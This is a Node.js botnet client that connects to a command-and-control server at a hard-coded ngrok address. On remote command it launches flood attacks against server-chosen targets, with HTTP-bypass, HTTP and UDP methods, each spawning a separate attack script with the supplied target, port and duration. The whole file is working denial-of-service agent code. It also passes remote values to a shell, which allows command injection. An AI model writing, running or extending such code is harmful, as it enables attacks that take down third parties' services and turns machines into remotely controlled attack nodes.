const io = require("socket.io-client");
const { spawn } = require("child_process");

const socket = io("https://4631-176-240-66-156.ngrok-free.app");

socket.on("connect", () => {
    console.log("Connected to WebSocket server");
});

socket.on("command", (data) => {
    console.log("Command received:", data);

    // HTTP-BYPASS 
    if (data.details && data.details.method === ".http-bypass") {
        const target = data.details.target;
        const port = data.details.port;
        const time = data.details.time;

        console.log(`Starting attack: node http.js ${target} ${port} ${time}`);

        const attackProcess = spawn("node", ["http-bypass/http-bypass.js", target, port, time], {
            stdio: "inherit",
            shell: true
        });

        attackProcess.on("exit", (code) => {
            console.log(`http.js process exited with code ${code}`);
        });

        attackProcess.on("error", (err) => {
            console.error("Failed to start http.js:", err);
        });
    }

    // HTTP-1    
    else if (data.details && data.details.method === ".http1") {
        const target = data.details.target;
        const port = data.details.port;
        const time = data.details.time;

        console.log(`Starting attack: node http.js ${target} ${port} ${time}`);

        const attackProcess = spawn("node", ["http/http.js", target, port, time], {
            stdio: "inherit",
            shell: true
        });

        attackProcess.on("exit", (code) => {
            console.log(`https-rps.js process exited with code ${code}`);
        });

        attackProcess.on("error", (err) => {
            console.error("Failed to start https-rps.js:", err);
        });
    }

    // UDP BASIC
    else if (data.details && data.details.method === ".udp") {
        const target = data.details.target;
        const port = data.details.port;
        const time = data.details.time;

        console.log(`Starting attack: ./udp/udp ${target} ${port} ${time}`);

        const attackProcess = spawn("./udp/udp", [target, port, time], {
            stdio: "inherit",
            shell: true
        });

        attackProcess.on("exit", (code) => {
            console.log(`udp process exited with code ${code}`);
        });

        attackProcess.on("error", (err) => {
            console.error("Failed to start udp:", err);
        });
    }

    else {
        console.log("Unsupported attack method or missing details.");
    }
});

socket.on("disconnect", () => {
    console.log("Disconnected from WebSocket server");
});
